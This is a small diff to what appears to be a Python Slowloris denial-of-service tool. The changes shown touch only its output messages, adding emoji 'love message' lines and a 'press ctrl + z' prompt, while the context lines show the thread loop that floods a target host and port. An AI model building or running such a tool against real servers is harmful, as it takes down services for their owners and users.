@@ -33,7 +33,7 @@ def slowloris(target, port, num_threads):
     for i in range(num_threads):
         thread = threading.Thread(target=slowloris_thread, args=(target, port))
         thread.start()
-        print(f"\033[1;33mSent love {i + 1} ❤️\033[0m")
+        print(f"\033[1;33mSent love message {i + 1} 💌\033[0m")
 
 if __name__ == "__main__":
     ascii_art_adirtta()  # Display the colorful ASCII art for 'ADIRTTA'
@@ -47,3 +47,7 @@ if __name__ == "__main__":
     print(f"\033[1;31mThank you for using my tool\033[0m")
 
     print(f"\033[1;31mmy github id: github.com/ADIRTTA\033[0m")
+
+    print(f"\033[1;31mpress ctrl + z\033[0m")
+
+   
